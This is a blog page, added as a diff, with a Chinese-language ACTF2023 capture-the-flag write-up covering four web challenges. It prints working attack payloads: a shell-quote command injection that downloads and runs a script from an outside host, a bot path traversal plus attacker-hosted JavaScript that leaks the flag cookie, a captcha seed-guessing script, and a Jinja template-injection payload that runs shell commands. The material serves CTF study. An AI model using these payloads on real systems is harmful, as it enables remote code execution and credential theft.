@@ -1,0 +1,430 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <!-- Google tag (gtag.js) -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-DT27XM4C8J"></script>
+    <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+
+    gtag('config', 'G-DT27XM4C8J');
+    </script>
+    
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="renderer" content="webkit">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <title>
+        unknown&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/libs/highlight/styles/monokai-sublime.css">
+
+    
+<link rel="stylesheet" href="/libs/font-awesome/css/font-awesome.min.css">
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+
+<body id="bodyx">
+    <div class="hd logodiv" style="margin-top: 3%;">
+    <!-- <img src="/img/logo.png" class="logopng"> -->
+    <p class="logot">
+        <a href="/" style="color: #4f4646;text-decoration: none;">
+            unknown&#39;s blog 
+        </a>
+    </p>
+</div>
+<div class="hd">
+    <ol class="breadcrumb">
+        
+            <li><a class="ba" href="/tech">Tech</a></li>
+        
+            <li><a class="ba" href="/life">Life</a></li>
+        
+            <li><a class="ba" href="/essay">Essay</a></li>
+        
+            <li><a class="ba" href="/links">Friends</a></li>
+        
+            <li><a class="ba" target="_blank" rel="noopener" href="https://running.unk.org.cn/">Running</a></li>
+        
+            <li><a class="ba" href="/about">About</a></li>
+        
+            <li><a class="ba" href="/subscribe">Subscribe</a></li>
+        
+    </ol>
+    <hr class="breadcrumbhr">
+</div>
+
+    
+<div class="hd posts">
+
+    <!-- <a href="/index.html">
+        <i class="fa fa-reply replay-btn" aria-hidden="true"></i>
+    </a> -->
+    <div class="post-title">
+        <p>
+            ACTF2023
+        </p>
+        <!-- <hr> -->
+    </div>
+    <div class="post-content">
+        <h1 id="craftcms"><a href="#craftcms" class="headerlink" title="craftcms"></a>craftcms</h1><p>一开始用网上现成的做法打imagick会无响应。后来lolita出了知道，原来是靶机打down一次，&#x2F;tmp就会有残留的php*文件，imagick读取到别的文件就继续down。所以打失败一次就必须重启一次靶机。</p>
+<p>打不通的时候想本地起一个环境的，但起环境太难给劝退了…..</p>
+<h1 id="Ave-Mujica’s-Masquerade"><a href="#Ave-Mujica’s-Masquerade" class="headerlink" title="Ave Mujica’s Masquerade"></a>Ave Mujica’s Masquerade</h1><p>做几个web题，就做这个的时候聪明点，懂得本地多打多测，而不是干看代码。</p>
+<p>shellQuote.quote的CVE原理在这：<a target="_blank" rel="noopener" href="https://wh0.github.io/2021/10/28/shell-quote-rce-exploiting.html">https://wh0.github.io/2021/10/28/shell-quote-rce-exploiting.html</a></p>
+<p>关键代码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if (url.includes(&quot;:&quot;)) &#123;</span><br><span class="line">  const parts = url.split(&quot;:&quot;);</span><br><span class="line">  host = parts[0];</span><br><span class="line">  port = parts.slice(1).join(&quot;:&quot;);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">  host = url;</span><br><span class="line">&#125;</span><br><span class="line">if (port) &#123;</span><br><span class="line">  command = shellQuote.quote([&quot;nmap&quot;, &quot;-p&quot;, port, host]); // Construct the shell command</span><br><span class="line">&#125; else &#123;</span><br><span class="line">  command = shellQuote.quote([&quot;nmap&quot;, &quot;-p&quot;, &quot;80&quot;, host]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">nmap = spawn(&quot;bash&quot;, [&quot;-c&quot;, command], &#123;stdio: [0,fdout,fderr] &#125; );</span><br></pre></td></tr></table></figure>
+
+<p>文章的payload不能直接打，因为题目会对payload分割处理，要多测才能测到正确的payload</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">文章的		`:`pwnme``:`</span><br><span class="line">题目的      :`:`pwnme``:`  会执行pwnme这个命令</span><br></pre></td></tr></table></figure>
+
+<p>执行命令的结果不能回显。命令不能带重定向符，不能带${IFS}和空格。队友测$IFS$9当做分隔符可以。</p>
+<p>坏了，能执行命令但又不会了。看了眼dockerfile，有wget和curl，考虑下载文件然后执行。</p>
+<p>看题目描述好像不出网？但自己测题目，给骗了，出网的。</p>
+<blockquote>
+<p>Enhancement: no echoes, internal network.</p>
+</blockquote>
+<p>然后执行：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">:`:`wget$IFS$9111.111.111.1111:18999/a.sh``:`</span><br></pre></td></tr></table></figure>
+
+<p>没权限直接执行.&#x2F;a.sh，sh$IFS$9a.sh就行。</p>
+<p>所有的操作都在本地运行，打印所有执行结果，方便排错。本地上线后才去上线靶机。</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/ACTF2023/b5059ae49cd1b07808e4095c7aad67f.png" alt="b5059ae49cd1b07808e4095c7aad67f.png"></p>
+<h1 id="easylatex"><a href="#easylatex" class="headerlink" title="easylatex"></a>easylatex</h1><h2 id="new-URL"><a href="#new-URL" class="headerlink" title="new URL"></a>new URL</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">new URL(&quot;1&quot;, `http://$&#123;req.headers.host&#125;/theme/`)</span><br><span class="line">这个url是http://$&#123;req.headers.host&#125;/theme/1</span><br><span class="line"></span><br><span class="line">new URL(&quot;http://vps:port/&quot;, `http://$&#123;req.headers.host&#125;/theme/`)</span><br><span class="line">这个url就是http://vps:port/，第二个参数不生效。</span><br><span class="line"></span><br><span class="line">比赛时只测了第一个，没测第二个。。。</span><br></pre></td></tr></table></figure>
+
+<h2 id="bot-visit-穿越"><a href="#bot-visit-穿越" class="headerlink" title="bot visit 穿越"></a>bot visit 穿越</h2><p>bot的visit存在穿越：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">app.get(&#x27;/share/:id&#x27;, reportLimiter, async (req, res) =&gt; &#123;</span><br><span class="line">    const &#123; id &#125; = req.params</span><br><span class="line">    console.log(id)</span><br><span class="line">    if (!id) &#123;</span><br><span class="line">        res.send(&#x27;no note id specified&#x27;)</span><br><span class="line">        return</span><br><span class="line">    &#125;</span><br><span class="line">    const url = `http://localhost:$&#123;PORT&#125;/note/$&#123;id&#125;`</span><br><span class="line">    try &#123;</span><br><span class="line">        await visit(url)</span><br><span class="line">        res.send(&#x27;done&#x27;)</span><br><span class="line">    &#125; catch (e) &#123;</span><br><span class="line">        console.log(e)</span><br><span class="line">        res.send(&#x27;something error&#x27;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
+
+<p>访问: <code>/share/..%2fpreview%3ftex=1%26theme=http%3a%2f%2f192.168.190.129:14444</code></p>
+<p>即可穿越到&#x2F;preview，带了参数tex和theme。</p>
+<p>比赛时想到了会不会存在穿越，但是没测，直接当做不会了。</p>
+<h2 id="CSP"><a href="#CSP" class="headerlink" title="CSP"></a>CSP</h2><p>note.html设置了CSP。即使成为了vip，设置了theme为自己服务器上的js代码，令bot去访问也无法引用执行。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;meta http-equiv=&quot;Content-Security-Policy&quot;</span><br><span class="line">    content=&quot;default-src &lt;%= theme_url %&gt; https://getbootstrap.com https://cdn.jsdelivr.net &#x27;nonce-&lt;%= nonce %&gt;&#x27;;&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/ACTF2023/1698674170753.png" alt="1698674170753.png"><br>preview.html没有设置CSP，可以执行js</p>
+<h2 id="base-js"><a href="#base-js" class="headerlink" title="base.js"></a>base.js</h2><p>当preview.html里的theme设置成自己的vps时，访问&#x2F;preview，会访问vps&#x2F;js&#x2F;base.js</p>
+<p>下面的是vps上放置的base.js文件</p>
+<p>token是session，session保存的username是vps地址。bot访问base.js文件，执行该js代码，带上cookie访问&#x2F;vip。此时的cookie有flag和session。随后&#x2F;vip会获取到cookie，带上cookie访问username。</p>
+<p>username指向的地址监听即可获取flag。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">async function asd()&#123;</span><br><span class="line">	//添加一个cookie，不会删除原来的。</span><br><span class="line">	//下面的fetch headers设置cookie无效，测过</span><br><span class="line">    document.cookie =  &#x27;token=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Imh0dHA6Ly8xOTIuMTY4LjE5MC4xMjk6MTU1NTUvIiwiaXNWaXAiOmZhbHNlLCJpYXQiOjE2OTg2NDY4NDl9.W_l_U9J-nvJjUYkGTdXaoFkBDBObvZotDpLi4FSWY-pb9BkcPWAd2WEKqdGQhsPC8izoSpXp3pXSWHrIQ93W9apSS4ywxmvhZ7bi3O43wpfMiWWXPgC36c9bQa-zMMv9f48l-MlVgU87mZGpB8CPUx6P73kAAGXnhpf9MvLArny93ZXECfiS5nDzjHInrCcFGM0GYZTTHQ3uKwzcaxSS7wa_Ir4oFTM_PUc6e_hCBCC5YUEyJHjknzAU1xUVPU6y0hiLoLpbXzM8axUHiN9j_CoGlXsteqa6sZsbD38OPD_-hG-xf8x2W3G7QE1T6FP_OrmBrkw3XL3eP2jQfDpemQ; Path=/&#x27;</span><br><span class="line">    await fetch(&#x27;http://localhost:3000/vip&#x27;, &#123;</span><br><span class="line">        method: &#x27;POST&#x27;,</span><br><span class="line">        headers: &#123;</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">asd()</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/ACTF2023/1698675367244.png" alt="1698675367244.png"></p>
+<h1 id="story"><a href="#story" class="headerlink" title="story"></a>story</h1><h2 id="得到随机种子"><a href="#得到随机种子" class="headerlink" title="得到随机种子"></a>得到随机种子</h2><p>题目访问一次&#x2F;captcha就会播一次种</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">self._key = (key or int(time.time())) + random.randint(1,100)</span><br><span class="line">random.seed(self._key)</span><br></pre></td></tr></table></figure>
+
+<p>这个种子挺好猜的。只要访问一次&#x2F;captcha，然后快速执行下面的脚本，就能得到种子以及之后的captcha。所以就能知道访问vip时候的captcha。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def test(seed,code):</span><br><span class="line">    random.seed(seed)</span><br><span class="line">    ccode = generate_code()</span><br><span class="line">    if code.upper() == ccode.upper():</span><br><span class="line">        return True</span><br><span class="line">    return False</span><br><span class="line"></span><br><span class="line">import time</span><br><span class="line">seed = int(time.time()) - 20 #产生的时间戳单位是s</span><br><span class="line">code = &#x27;C5Hp&#x27;</span><br><span class="line">for i in range(200):</span><br><span class="line">    seedd = seed + i</span><br><span class="line">    if test(seedd,code):</span><br><span class="line">        print(seedd)</span><br><span class="line">        random.seed(seedd)</span><br><span class="line">        gen = Captcha(seedd,200, 80)</span><br><span class="line">        buf , captcha_text = gen.generate()</span><br><span class="line">        print(captcha_text)</span><br><span class="line">        print(generate_code())</span><br><span class="line">        print(generate_code())</span><br><span class="line">        print(generate_code())</span><br><span class="line">        print(generate_code())</span><br><span class="line">        break</span><br></pre></td></tr></table></figure>
+
+<h2 id="摇3个相同的waf"><a href="#摇3个相同的waf" class="headerlink" title="摇3个相同的waf"></a>摇3个相同的waf</h2><p>下面选waf的代码，大致看了眼，从6个waf中选3个。第一反应要写6组合3也就是20种payload，针对每3种waf用不同的payload。仔细看了后发现任意3个组合到一起都不可能过，就歇逼睡觉去了。</p>
+<p>起床后发现lolita说绕一种就行，我再细看代码，想到摇到3个相同waf就行。第一反应，我靠，这怎么可能，然后本地运行试试，发现摇到3个相同的概率还挺大的…..</p>
+<p>靠，又是只看代码不测，我是sb。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import random</span><br><span class="line">rule = [</span><br><span class="line">    [&#x27;\\x&#x27;,&#x27;[&#x27;,&#x27;]&#x27;,&#x27;.&#x27;,&#x27;getitem&#x27;,&#x27;print&#x27;,&#x27;request&#x27;,&#x27;args&#x27;,&#x27;cookies&#x27;,&#x27;values&#x27;,&#x27;getattribute&#x27;,&#x27;config&#x27;],                   # rule 1</span><br><span class="line">    [&#x27;(&#x27;,&#x27;]&#x27;,&#x27;getitem&#x27;,&#x27;_&#x27;,&#x27;%&#x27;,&#x27;print&#x27;,&#x27;config&#x27;,&#x27;args&#x27;,&#x27;values&#x27;,&#x27;|&#x27;,&#x27;\&#x27;&#x27;,&#x27;\&quot;&#x27;,&#x27;dict&#x27;,&#x27;,&#x27;,&#x27;join&#x27;,&#x27;.&#x27;,&#x27;set&#x27;],              # rule 2</span><br><span class="line">    [&#x27;\&#x27;&#x27;,&#x27;\&quot;&#x27;,&#x27;dict&#x27;,&#x27;,&#x27;,&#x27;config&#x27;,&#x27;join&#x27;,&#x27;\\x&#x27;,&#x27;)&#x27;,&#x27;[&#x27;,&#x27;]&#x27;,&#x27;attr&#x27;,&#x27;__&#x27;,&#x27;list&#x27;,&#x27;globals&#x27;,&#x27;.&#x27;],                           # rule 3</span><br><span class="line">    [&#x27;[&#x27;,&#x27;)&#x27;,&#x27;getitem&#x27;,&#x27;request&#x27;,&#x27;.&#x27;,&#x27;|&#x27;,&#x27;config&#x27;,&#x27;popen&#x27;,&#x27;dict&#x27;,&#x27;doc&#x27;,&#x27;\\x&#x27;,&#x27;_&#x27;,&#x27;\&#123;\&#123;&#x27;,&#x27;mro&#x27;],                          # rule 4</span><br><span class="line">    [&#x27;\\x&#x27;,&#x27;(&#x27;,&#x27;)&#x27;,&#x27;config&#x27;,&#x27;args&#x27;,&#x27;cookies&#x27;,&#x27;values&#x27;,&#x27;[&#x27;,&#x27;]&#x27;,&#x27;\&#123;\&#123;&#x27;,&#x27;.&#x27;,&#x27;request&#x27;,&#x27;|&#x27;,&#x27;attr&#x27;],                          # rule 5</span><br><span class="line">    [&#x27;print&#x27;, &#x27;class&#x27;, &#x27;import&#x27;, &#x27;eval&#x27;, &#x27;__&#x27;, &#x27;request&#x27;,&#x27;args&#x27;,&#x27;cookies&#x27;,&#x27;values&#x27;,&#x27;|&#x27;,&#x27;\\x&#x27;,&#x27;getitem&#x27;]                  # rule 6</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">def transfrom(number):</span><br><span class="line">    a = random.randint(0,20)</span><br><span class="line">    b = random.randint(0,100)</span><br><span class="line">    return (a * number + b) % 6</span><br><span class="line"></span><br><span class="line">def singel_waf(input, rules):</span><br><span class="line">    input = input.lower()</span><br><span class="line">    for rule in rules:</span><br><span class="line">        if rule in input:</span><br><span class="line">            return False</span><br><span class="line">    return True</span><br><span class="line"></span><br><span class="line">def minic_waf(input):</span><br><span class="line">    waf_seq = random.sample(range(21),3)</span><br><span class="line">    for index in range(len(waf_seq)):</span><br><span class="line">        waf_seq[index] = transfrom(waf_seq[index])</span><br><span class="line">        print(rule[waf_seq[index]])</span><br><span class="line">        if not singel_waf(input, rule[waf_seq[index]]):</span><br><span class="line">            return False</span><br><span class="line">    return True</span><br></pre></td></tr></table></figure>
+
+<p>本地打，不到3分钟就摇到了。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">story = &quot;&#123;&#123;lipsum[&#x27;_&#x27;&#x27;_glo&#x27;&#x27;bals_&#x27;&#x27;_&#x27;][&#x27;_&#x27;&#x27;_builtins_&#x27;&#x27;_&#x27;][&#x27;_&#x27;&#x27;_impo&#x27;&#x27;rt_&#x27;&#x27;_&#x27;](&#x27;os&#x27;).popen(&#x27;cat f*&#x27;).read()&#125;&#125;&quot;</span><br><span class="line">cookies = &#123;&#x27;session&#x27;:&#x27;eyJjYXB0Y2hhIjoiZFRyRSIsInVzZXJuYW1lIjoiMTIzIiwidmlwIjp0cnVlfQ.ZUD_lw.T0MsH0UtcsajVwlAxS748Hh3_jU; HttpOnly; Path=/&#x27;&#125;</span><br><span class="line">import time</span><br><span class="line">while True:</span><br><span class="line">    res = requests.post(&#x27;http://192.168.190.129:5001/write&#x27;,json=&#123;&quot;story&quot;:story&#125;,cookies=cookies)</span><br><span class="line">    if &#x27;success&#x27; in res.text:</span><br><span class="line">        print(res.headers)</span><br><span class="line">        print(res.cookies)</span><br><span class="line">        break</span><br><span class="line">    print(&#x27;failed!&#x27;)</span><br><span class="line">    time.sleep(0.5)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/ACTF2023/image-20231031220924167.png" alt="image-20231031220924167.png"><br><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/ACTF2023/1698761463686.png" alt="1698761463686.png"></p>
+
+    </div>
+    
+    <div class="toc-container">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#craftcms"><span class="toc-text">craftcms</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Ave-Mujica%E2%80%99s-Masquerade"><span class="toc-text">Ave Mujica’s Masquerade</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#easylatex"><span class="toc-text">easylatex</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#new-URL"><span class="toc-text">new URL</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bot-visit-%E7%A9%BF%E8%B6%8A"><span class="toc-text">bot visit 穿越</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CSP"><span class="toc-text">CSP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#base-js"><span class="toc-text">base.js</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#story"><span class="toc-text">story</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BE%97%E5%88%B0%E9%9A%8F%E6%9C%BA%E7%A7%8D%E5%AD%90"><span class="toc-text">得到随机种子</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%91%873%E4%B8%AA%E7%9B%B8%E5%90%8C%E7%9A%84waf"><span class="toc-text">摇3个相同的waf</span></a></li></ol></li></ol>
+    </div>
+
+    
+        <div id="custom-comments" class="custom-comments">
+    <h3>Comments</h3>
+    <form id="comment-form" class="comment-form">
+        <div class="form-row">
+            <input type="text" id="c-nickname" placeholder="Nickname *" required>
+            <input type="email" id="c-email" placeholder="Email">
+            <input type="url" id="c-website" placeholder="Website">
+        </div>
+        <textarea id="c-content" placeholder="Leave a comment..." required></textarea>
+        <button type="submit" id="c-submit">Submit</button>
+    </form>
+    <div id="comment-list" class="comment-list">
+        <!-- Comments will be loaded here -->
+        <p class="loading">Loading comments...</p>
+    </div>
+</div>
+
+<style>
+    .custom-comments {
+        margin-top: 40px;
+        border-top: 1px solid #eee;
+        padding-top: 20px;
+    }
+    .comment-form {
+        margin-bottom: 30px;
+    }
+    .comment-form .form-row {
+        display: flex;
+        gap: 10px;
+        margin-bottom: 10px;
+    }
+    .comment-form input, .comment-form textarea {
+        width: 100%;
+        padding: 8px;
+        border: 1px solid #ddd;
+        border-radius: 4px;
+        background: #f9f9f9;
+    }
+    .comment-form textarea {
+        height: 100px;
+        resize: vertical;
+        margin-bottom: 10px;
+    }
+    .comment-form button {
+        padding: 8px 20px;
+        background: #333;
+        color: #fff;
+        border: none;
+        border-radius: 4px;
+        cursor: pointer;
+    }
+    .comment-form button:hover {
+        background: #555;
+    }
+    .comment-item {
+        margin-bottom: 20px;
+        border-bottom: 1px solid #f0f0f0;
+        padding-bottom: 15px;
+    }
+    .comment-header {
+        margin-bottom: 5px;
+        font-size: 0.9em;
+        color: #666;
+    }
+    .comment-author {
+        font-weight: bold;
+        color: #333;
+        margin-right: 10px;
+    }
+    .comment-date {
+        font-size: 0.8em;
+        color: #999;
+    }
+    .comment-content {
+        line-height: 1.6;
+        color: #333;
+    }
+</style>
+
+<script>
+(function() {
+    const apiUrl = 'https://unk-blo-backend-rduuehbram.cn-shenzhen.fcapp.run';
+    const postUrl = window.location.pathname;
+    const commentList = document.getElementById('comment-list');
+    const commentForm = document.getElementById('comment-form');
+    const submitBtn = document.getElementById('c-submit');
+
+    function formatDate(timestamp) {
+        return new Date(timestamp).toLocaleString();
+    }
+
+    function escapeHtml(text) {
+        if (!text) return '';
+        return text
+            .replace(/&/g, "&amp;")
+            .replace(/</g, "&lt;")
+            .replace(/>/g, "&gt;")
+            .replace(/"/g, "&quot;")
+            .replace(/'/g, "&#039;");
+    }
+
+    // Load comments
+    fetch(`${apiUrl}/api/comments?url=${encodeURIComponent(postUrl)}`)
+        .then(response => response.json())
+        .then(data => {
+            commentList.innerHTML = '';
+            if (data.comments && data.comments.length > 0) {
+                data.comments.forEach(comment => {
+                    const div = document.createElement('div');
+                    div.className = 'comment-item';
+                    
+                    let authorHtml = `<span class="comment-author">${escapeHtml(comment.nickname)}</span>`;
+                    if (comment.website) {
+                        authorHtml = `<a href="${escapeHtml(comment.website)}" target="_blank" class="comment-author">${escapeHtml(comment.nickname)}</a>`;
+                    }
+
+                    div.innerHTML = `
+                        <div class="comment-header">
+                            ${authorHtml}
+                            <span class="comment-date">${formatDate(comment.timestamp)}</span>
+                        </div>
+                        <div class="comment-content">${escapeHtml(comment.content)}</div>
+                    `;
+                    commentList.appendChild(div);
+                });
+            } else {
+                commentList.innerHTML = '<p>No comments yet. Be the first!</p>';
+            }
+        })
+        .catch(err => {
+            console.error('Error loading comments:', err);
+            commentList.innerHTML = '<p>Error loading comments.</p>';
+        });
+
+    // Submit comment
+    commentForm.addEventListener('submit', function(e) {
+        e.preventDefault();
+        
+        const nickname = document.getElementById('c-nickname').value;
+        const email = document.getElementById('c-email').value;
+        const website = document.getElementById('c-website').value;
+        const content = document.getElementById('c-content').value;
+
+        submitBtn.disabled = true;
+        submitBtn.innerText = 'Submitting...';
+
+        fetch(`${apiUrl}/api/comment`, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                post_url: postUrl,
+                nickname: nickname,
+                email: email,
+                website: website,
+                content: content
+            })
+        })
+        .then(response => response.json())
+        .then(data => {
+            if (data.message) {
+                // Add new comment to list immediately
+                const div = document.createElement('div');
+                div.className = 'comment-item';
+                div.innerHTML = `
+                    <div class="comment-header">
+                        <span class="comment-author">${escapeHtml(nickname)}</span>
+                        <span class="comment-date">Just now</span>
+                    </div>
+                    <div class="comment-content">${escapeHtml(content)}</div>
+                `;
+                
+                // Insert at the beginning or append if empty
+                if (commentList.querySelector('.comment-item')) {
+                    commentList.insertBefore(div, commentList.firstChild);
+                } else {
+                    commentList.innerHTML = '';
+                    commentList.appendChild(div);
+                }
+                
+                commentForm.reset();
+            } else {
+                alert('Error: ' + (data.error || 'Unknown error'));
+            }
+        })
+        .catch(err => {
+            console.error('Error submitting comment:', err);
+            alert('Error submitting comment');
+        })
+        .finally(() => {
+            submitBtn.disabled = false;
+            submitBtn.innerText = 'Submit';
+        });
+    });
+})();
+</script>
+
+    
+
+
+</div>
+<script>
+    window.onload = ()=>{
+
+        document.title = document.querySelector('.post-title p').innerText;
+
+        var zoomImgs = function() {
+            const images = document.querySelectorAll('.post-content img'); // Only select images in post content
+            images.forEach(img => {
+                img.style.width = '70%'
+                img.style.height = 'auto'
+            });
+        }
+
+        zoomImgs()
+    }
+    
+</script>
+    
+    <div class="footer" id="footer">
+    <p>Copyright © 2020 <a class="flink" target="_blank" rel="noopener" href="https://hexo.io">Hexo</a>-<a class="flink" target="_blank" rel="noopener" href="https://github.com/sanjinhub/hexo-theme-geek">Geek</a>.
+    </p>
+</div>
+
+<input type="hidden" id="valine_appid" value="diYBpeShV6s47KsfNez5JmBU-gzGzoHsz">
+<input type="hidden" id="valine_appKey" value="u3BEDbLDNridDApcAzJBWc9N">
+<input type="hidden" id="valine_enable" value="false">
+<input type="hidden" id="valine_placeholder" value="留下你的评论吧...">
+<input type="hidden" id="valine_avatar" value="hide">
+
+
+<script src="/libs/jquery.min.js"></script>
+
+
+<script src="/js/lightbox.js"></script>
+
+
+
+<script>
+
+    var valine_appid = $("#valine_appid").val();
+    var valine_appKey = $("#valine_appKey").val();
+    var valine_enable = $("#valine_enable").val();
+    var valine_placeholder = $("#valine_placeholder").val();
+    var valine_avatar = $("#valine_avatar").val();
+
+    if(valine_enable == 'true'){
+        // Valine initialization code only if enabled
+        if (typeof Valine !== 'undefined') {
+            new Valine({
+                el: '#vcomments',
+                appId: valine_appid,
+                appKey: valine_appKey,
+                placeholder: valine_placeholder,
+                avatar: valine_avatar,
+            })
+        }
+    }
+
+</script>
+
+<style type="text/css">
+.v * {
+    color: #698fca;
+}
+
+.v .vlist .vcard .vhead .vsys {
+    color: #3a3e4a;
+}
+
+.v .vlist .vcard .vh .vmeta .vat {
+    color: #638fd5;
+}
+
+.v .vlist .vcard .vhead .vnick {
+    color: #6ba1ff;
+}
+
+.v a {
+    color: #8696b1;
+}
+
+.v .vlist .vcard .vhead .vnick:hover {
+    color: #669bfc;
+}
+</style>
+</body>
+
+</html>
